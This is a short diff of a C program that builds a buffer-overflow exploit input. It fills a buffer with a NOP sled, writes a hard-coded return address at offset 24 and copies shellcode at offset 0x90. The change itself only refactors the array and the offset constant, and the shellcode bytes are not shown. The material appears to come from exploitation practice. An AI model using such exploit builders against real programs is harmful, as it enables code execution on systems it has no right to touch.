@@ -28,12 +28,16 @@ int main(int argc, char ** argv) {
 	/* Init the buffer with nop (0x90) */
 	memset(&buffer, 0x90, 512);
 
-        int a[4] = {0xb0, 0xf2, 0xff, 0xbf};
+        int* a = (int*)malloc(sizeof(int) * 4);
+        a[0] = 0xb0; a[1] = 0xf2; a[2] = 0xff; a[3] = 0xbf;
         buffer[24 + 0] = a[0];
         buffer[24 + 1] = a[1];
         buffer[24 + 2] = a[2];
         buffer[24 + 3] = a[3];
-        int delta = 9 * 16;
+        int delta = 0x90;
+        
+        free(a);
+        a = NULL;
         
         strcpy(buffer+delta, shellcode);
 
